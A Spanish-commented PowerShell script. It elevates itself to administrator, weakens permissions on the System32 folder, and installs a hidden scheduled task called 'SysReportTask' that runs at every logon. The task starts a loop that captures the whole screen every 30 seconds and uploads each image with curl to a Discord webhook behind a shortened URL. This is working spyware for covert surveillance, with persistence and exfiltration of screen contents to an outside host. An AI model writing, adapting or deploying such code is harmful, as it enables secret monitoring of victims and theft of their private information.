# Verificar si el script se está ejecutando con privilegios elevados (como administrador)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Exit
}

# Definir la URL del webhook de Discord
$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord

# Definir el nombre del directorio y el script
$directoryName = "C:\Windows\System32\Scripts"
$scriptName = "sys_report.ps1"

# Crear el directorio si no existe y asignar permisos
if (-not (Test-Path -Path $directoryName)) {
    New-Item -Path $directoryName -ItemType Directory | Out-Null
    $ACL = Get-Acl -Path $directoryName
    $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
    $ACL.AddAccessRule($AccessRule)
    Set-Acl -Path $directoryName -AclObject $ACL
}

# Obtener la ruta completa de System32
$system32Path = [Environment]::GetFolderPath([Environment+SpecialFolder]::System)

# Forzar los permisos en la carpeta System32
$system32ACL = Get-Acl -Path $system32Path
$system32AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
$system32ACL.SetAccessRule($system32AccessRule)
Set-Acl -Path $system32Path -AclObject $system32ACL

# Definir el contenido del script
$scriptContent = @"
`$hookurl = "$hookurl"
`$seconds = 30 # Intervalo de captura de pantalla en segundos
`$a = 0 # Contador de capturas de pantalla

# Bucle infinito para tomar capturas de pantalla continuamente
while (`$true) {
    `$a++
    `$Filett = "$env:temp\SC_$a.png"  # Ruta del archivo de la captura de pantalla
    
    # Obtiene las dimensiones de la pantalla virtual
    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    `$Width = `$Screen.Width
    `$Height = `$Screen.Height
    `$Left = `$Screen.Left
    `$Top = `$Screen.Top
    
    # Crea un objeto Bitmap y copia la pantalla en él
    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
    
    # Guarda la captura de pantalla como un archivo PNG
    `$bitmap.Save(`$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Envía la captura de pantalla al webhook de Discord
    curl.exe -F "file1=@`$Filett" `$hookurl
    
    # Elimina el archivo de la captura de pantalla
    Remove-Item -Path `$Filett
    
    # Espera el intervalo de tiempo especificado antes de tomar otra captura de pantalla
    Start-Sleep -Seconds `$seconds
}
"@

# Guardar el script en el archivo
$scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

# Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
Register-ScheduledTask -InputObject $task -Force | Out-Null
Enable-ScheduledTask -TaskName "SysReportTask" | Out-Null
